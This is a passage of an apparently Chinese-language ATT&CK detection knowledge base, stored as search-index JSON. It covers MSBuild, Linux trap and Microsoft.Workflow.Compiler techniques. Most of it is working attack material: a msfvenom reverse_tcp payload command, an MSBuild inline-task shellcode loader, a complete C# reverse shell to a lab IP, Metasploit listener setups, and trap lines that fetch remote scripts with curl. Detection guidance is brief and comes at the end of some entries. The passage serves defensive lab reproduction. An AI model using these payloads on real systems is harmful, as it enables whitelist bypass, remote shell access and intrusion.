sbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>MSBuild \u662f Microsoft Build Engine \u7684\u7f29\u5199\uff0c\u4ee3\u8868 Microsoft \u548c Visual Studio\u7684\u65b0\u7684\u751f\u6210\u5e73\u53f0\u3002MSBuild\u5728\u5982\u4f55\u5904\u7406\u548c\u751f\u6210\u8f6f\u4ef6\u65b9\u9762\u662f\u5b8c\u5168\u900f\u660e\u7684\uff0c\u4f7f\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u5728\u672a\u5b89\u88c5Visual Studio\u7684\u751f\u6210\u5b9e\u9a8c\u5ba4\u73af\u5883\u4e2d\u7ec4\u7ec7\u548c\u751f\u6210\u4ea7\u54c1\u3002</p> <p>MSBuild \u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u57fa\u4e8e XML\u7684\u9879\u76ee\u6587\u4ef6\u683c\u5f0f\uff0c\u8fd9\u79cd\u683c\u5f0f\u5bb9\u6613\u7406\u89e3\u3001\u6613\u4e8e\u6269\u5c55\u5e76\u4e14\u5b8c\u5168\u53d7 Microsoft \u652f\u6301\u3002MSBuild\u9879\u76ee\u6587\u4ef6\u7684\u683c\u5f0f\u4f7f\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u5145\u5206\u63cf\u8ff0\u54ea\u4e9b\u9879\u9700\u8981\u751f\u6210\uff0c\u4ee5\u53ca\u5982\u4f55\u5229\u7528\u4e0d\u540c\u7684\u5e73\u53f0\u548c\u914d\u7f6e\u751f\u6210\u8fd9\u4e9b\u9879\u3002</p> <p>\u8bf4\u660e\uff1aMsbuild.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cMsbuild\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p> <p>win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p><code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe</code></p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09\u636e\u79f0\u53ef\u4ee5\u7ed5\u8fc7360\uff0c\u5f85\u786e\u8ba4</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows server 2012</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u6d4b\u8bd5\u8fc7\u7a0b","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#msf","title":"MSF\u751f\u6210\u8f7d\u8377","text":"<pre><code>msfvenom -a x86 \u2013platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#xml","title":"XML\u6587\u4ef6\u8bbe\u7f6e","text":"<pre><code>&lt;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"&gt;\n&lt;!-- This inline task executes shellcode. --&gt;\n&lt;!-- C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe SimpleTasks.csproj --&gt;\n&lt;!-- Save This File And Execute The Above Command --&gt;\n&lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;\n&lt;!-- License: BSD 3-Clause --&gt;\n&lt;Target Name=\"Hello\"&gt;\n&lt;ClassExample /&gt;\n&lt;/Target&gt;\n&lt;UsingTask\nTaskName=\"ClassExample\"\nTaskFactory=\"CodeTaskFactory\"\nAssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt;\n&lt;Task&gt;\n\n&lt;Code Type=\"Class\" Language=\"cs\"&gt;\n&lt;![CDATA[\n    using System;\n    using System.Runtime.InteropServices;\n    using Microsoft.Build.Framework;\n    using Microsoft.Build.Utilities;\n    public class ClassExample :  Task, ITask\n    {\n      private static UInt32 MEM_COMMIT = 0x1000;\n      private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n      [DllImport(\"kernel32\")]\n        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,\n        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n      [DllImport(\"kernel32\")]\n        private static extern IntPtr CreateThread(\n        UInt32 lpThreadAttributes,\n        UInt32 dwStackSize,\n        UInt32 lpStartAddress,\n        IntPtr param,\n        UInt32 dwCreationFlags,\n        ref UInt32 lpThreadId\n        );\n      [DllImport(\"kernel32\")]\n        private static extern UInt32 WaitForSingleObject(\n        IntPtr hHandle,\n        UInt32 dwMilliseconds\n        );\n      public override bool Execute()\n      {\n        byte[] shellcode = new byte[] {\n\u4f60\u7684payload};\n\n          UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,\n      MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n          Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);\n          IntPtr hThread = IntPtr.Zero;\n          UInt32 threadId = 0;\n          IntPtr pinfo = IntPtr.Zero;\n          hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n          WaitForSingleObject(hThread, 0xFFFFFFFF);\n          return true;\n      }\n    }\n        ]]&gt;\n&lt;/Code&gt;\n&lt;/Task&gt;\n&lt;/UsingTask&gt;\n&lt;/Project&gt;\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u8bbe\u7f6e\u76d1\u542c","text":"<pre><code>use exploit/multi/handler\nmsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\nmsf exploit(multi/handler) &gt; set lhost 192.168.126.146\nmsf exploit(multi/handler) &gt; set lport 4444\nmsf exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe file.xml\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u67e5\u770b\u4f1a\u8bdd","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_9","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1127</p> <p>https://attack.mitre.org/techniques/T1127/</p> <p>\u5229\u7528msbuild.exe\u7ed5\u8fc7\u5e94\u7528\u7a0b\u5e8f\u767d\u540d\u5355\u5b89\u5168\u673a\u5236\u7684\u591a\u79cd\u59ff\u52bf</p> <p>https://www.freebuf.com/articles/network/197706.html</p> <p>GreatSCT|MSF|\u767d\u540d\u5355</p> <p>http://www.secist.com/archives/6082.html</p> <p>\u5bf9\u4eae\u795e\u57fa\u4e8e\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload\u7b2c\u4e00\u5b63\u590d\u73b0</p> <p>https://blog.csdn.net/ws13129/article/details/89736941</p> <p>\u68c0\u6d4b\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload</p> <p>https://blog.csdn.net/qq_36334464/article/details/105487176</p> <p>\u57fa\u4e8e\u767d\u540d\u5355\u6267\u884cpayload</p> <p>https://www.jianshu.com/p/cdb1867c6abb</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/","title":"T1154-linux-trap","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u8be5<code>trap</code>\u547d\u4ee4\u5141\u8bb8\u7a0b\u5e8f\u548cshell\u6307\u5b9a\u5728\u63a5\u6536\u4e2d\u65ad\u4fe1\u53f7\u65f6\u5c06\u6267\u884c\u7684\u547d\u4ee4\u3002\u5e38\u89c1\u7684\u60c5\u51b5\u662f\u811a\u672c\u5141\u8bb8\u6b63\u5e38\u7ec8\u6b62\u548c\u5904\u7406\u5e38\u89c1\u7684\u952e\u76d8\u4e2d\u65ad\uff0c\u5982<code>ctrl+c</code>\u548c<code>ctrl+d</code>\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u6ce8\u518c\u5f53shell\u9047\u5230\u7279\u5b9a\u4e2d\u65ad\u4ee5\u6267\u884c\u6216\u4f5c\u4e3a\u6301\u4e45\u6027\u673a\u5236\u65f6\u8981\u6267\u884c\u7684\u4ee3\u7801\u3002\u9677\u9631\u547d\u4ee4\u5177\u6709\u4ee5\u4e0b\u683c\u5f0f<code>trap 'command list' signals</code>\uff0c\u5176\u4e2d\u5f53\u63a5\u6536\u5230\u201c\u4fe1\u53f7\u201d\u65f6\u5c06\u6267\u884c\u201c\u547d\u4ee4\u5217\u8868\u201d\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<pre><code>trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh # \u811a\u672c\u5373\u4f7f\u5728\u9000\u51fa\u540e\uff08ctrl + c\uff09\u4e5f\u4f1a\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f/\u811a\u672c\u3002\n\ntrap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh\n</code></pre> <p>\u5173\u4e8etrap\u3001nohup\u547d\u4ee4\u7684\u66f4\u591a\u89e3\u91ca\uff0c\u4f60\u53ef\u4ee5\u67e5\u770b\u53c2\u8003\u94fe\u63a5\u90e8\u5206\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>bash\u5386\u53f2\u547d\u4ee4</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>icbc@icbc:/$ trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh\n\n&gt; ^C\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>icbc@icbc:/$ history\n\n693  trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#splunk","title":"splunk\u89c4\u5219","text":"<p>index=linux sourcetype=bash_history \"trap *\" | table host,user_name,bash_command</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1154</p> <p>https://attack.mitre.org/techniques/T1154/</p> <p>linux\u4e0btrap\u547d\u4ee4\u8be6\u89e3</p> <p>https://blog.csdn.net/carolzhang8406/article/details/46504415/</p> <p>linux\u4e0bnohup\u547d\u4ee4\u6d45\u6790</p> <p>https://www.bbsmax.com/A/kjdw9606JN/</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/","title":"T1218-001-win-\u57fa\u4e8e\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u8bb8\u591a\u8f6f\u4ef6\u5f00\u53d1\u76f8\u5173\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6267\u884c\u5404\u79cd\u5f62\u5f0f\u7684\u4ee3\u7801\u4ee5\u534f\u52a9\u5f00\u53d1\u3001\u8c03\u8bd5\u548c\u9006\u5411\u5de5\u7a0b\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528\u5408\u6cd5\u8bc1\u4e66\u8fdb\u884c\u7b7e\u540d\u3002\u7b7e\u540d\u540e\uff0c\u5b83\u4eec\u5c31\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c\u5e76\u901a\u8fc7\u53ef\u4fe1\u7684\u8fdb\u7a0b\u4ee3\u7406\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u6709\u6548\u5730\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u9632\u5fa1\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Microsoft.Workflow.Comiler.exe\u662f.NET Framework\u9ed8\u8ba4\u81ea\u5e26\u7684\u4e00\u4e2a\u5b9e\u7528\u5de5\u5177\uff0c\u7528\u6237\u80fd\u591f\u4ee5XOML\u5de5\u4f5c\u6d41\u6587\u4ef6\u7684\u5f62\u5f0f\u63d0\u4f9b\u4e00\u4e2a\u5e8f\u5217\u5316\u5de5\u4f5c\u6d41\u6765\u6267\u884c\u4efb\u610f\u672a\u7b7e\u540d\u7684\u4ee3\u7801\u3002</p> <p>Microsoft.Workflow.Comiler.exe\u9700\u8981\u4e24\u4e2a\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2aXML\u6587\u4ef6\uff08\u7531\u4e00\u4e2a\u5e8f\u5217\u5316CompilerInput\u5bf9\u8c61\u6784\u6210\uff09\u7684\u8def\u5f84\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u662f\u5199\u5165\u5e8f\u5217\u5316\u7f16\u8bd1\u7ed3\u679c\u7684\u6587\u4ef6\u8def\u5f84\u3002</p> <p>\u8bf4\u660e\uff1aMicrosoft.Workflow.Compiler.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cMicrosoft.Workflow.Compiler\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p> <p>win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p><code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe</code></p> <p><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe</code></p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows server 2012</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#1","title":"\u65b9\u6cd51","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#pocxml","title":"POC.xml","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf\u20108\"?&gt;\n\n&lt;CompilerInput xmlns:i=\"http://www.w3.org/2001/XMLSchema\u2010instance\" xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler\"\n\n&lt;files xmlns:d2p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\"&gt;\n\n&lt;d2p1:string&gt;add.tcp&lt;/d2p1:string&gt;\n\n&lt;/files&gt;\n\n&lt;parameters xmlns:d2p1=\"http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler\"&gt;\n\n&lt;assemblyNames xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /&gt;\n\n&lt;compilerOptions i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /&gt;\n\n&lt;coreAssemblyFileName xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"&gt;&lt;/coreAssemblyFileName&gt;\n\n&lt;embeddedResources xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /&gt;\n\n&lt;evidence xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.Security.Policy\" i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /&gt;\n\n&lt;generateExecutable xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"&gt;false&lt;/generateExecutable&gt;\n\n&lt;generateInMemory xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"&gt;true&lt;/generateInMemory&gt;\n\n&lt;includeDebugInformation xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"&gt;false&lt;/includeDebugInformation&gt;\n\n&lt;linkedResources xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /&gt;\n\n&lt;mainClass i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /&gt;\n\n&lt;outputName xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"&gt;&lt;/outputName&gt;\n\n&lt;tempFiles i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /&gt;\n\n&lt;treatWarningsAsErrors xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"&gt;false&lt;/treatWarningsAsErrors&gt;\n\n&lt;warningLevel xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"&gt;\u20101&lt;/warningLevel&gt;\n\n&lt;win32Resource i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /&gt;\n\n&lt;d2p1:checkTypes&gt;false&lt;/d2p1:checkTypes&gt;\n\n&lt;d2p1:compileWithNoCode&gt;false&lt;/d2p1:compileWithNoCode&gt;\n\n&lt;d2p1:compilerOptions i:nil=\"true\" /&gt;\n\n&lt;d2p1:generateCCU&gt;false&lt;/d2p1:generateCCU&gt;\n\n&lt;d2p1:languageToUse&gt;CSharp&lt;/d2p1:languageToUse&gt;\n\n&lt;d2p1:libraryPaths xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" i:nil=\"true\" /&gt;\n\n&lt;d2p1:localAssembly xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.Reflection\" i:nil=\"true\" /&gt;\n\n&lt;d2p1:mtInfo i:nil=\"true\" /&gt;\n\n&lt;d2p1:userCodeCCUs xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.CodeDom\" i:nil=\"true\" /&gt;\n\n&lt;/parameters&gt;\n\n&lt;/CompilerInput&gt;\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#addtcp","title":"add.tcp","text":"<pre><code>using System;\n\nusing System.Text;\n\nusing System.IO;\n\nusing System.Diagnostics;\n\nusing System.ComponentModel;\n\nusing System.Net;\n\nusing System.Net.Sockets;\n\nusing System.Workflow.Activities;\n\npublic class Program : SequentialWorkflowActivity\n\n{\n\nstatic StreamWriter streamWriter;\n\npublic Program()\n\n{\n\nusing(TcpClient client = new TcpClient(\"192.168.126.146\", 4444))\n\n{\n\nusing(Stream stream = client.GetStream())\n\n{\n\nusing(StreamReader rdr = new StreamReader(stream))\n\n{\n\nstreamWriter = new StreamWriter(stream);\n\nStringBuilder strInput = new StringBuilder();\n\nProcess p = new Process();\n\np.StartInfo.FileName = \"cmd.exe\";\n\np.StartInfo.CreateNoWindow = true;\n\np.StartInfo.UseShellExecute = false;\n\np.StartInfo.RedirectStandardOutput = true;\n\np.StartInfo.RedirectStandardInput = true;\n\np.StartInfo.RedirectStandardError = true;\n\np.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\np.Start();\n\np.BeginOutputReadLine();\n\nwhile(true)\n\n{\n\nstrInput.Append(rdr.ReadLine());\n\np.StandardInput.WriteLine(strInput);\n\nstrInput.Remove(0, strInput.Length);\n\n}\n\n}\n\n}\n\n}\n\n}\n\nprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n\n{\n\nStringBuilder strOutput = new StringBuilder();\n\nif (!String.IsNullOrEmpty(outLine.Data))\n\n{\n\ntry\n\n{\n\nstrOutput.Append(outLine.Data);\n\nstreamWriter.WriteLine(strOutput);\n\nstreamWriter.Flush();\n\n}\n\ncatch (Exception err) { }\n\n}\n\n}\n\n}\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u8bbe\u7f6e\u76d1\u542c","text":"<pre><code>use exploit/multi/handler\nmsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\nmsf exploit(multi/handler) &gt; set lhost 192.168.126.146\nmsf exploit(multi/handler) &gt; set lport 4444\nmsf exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml 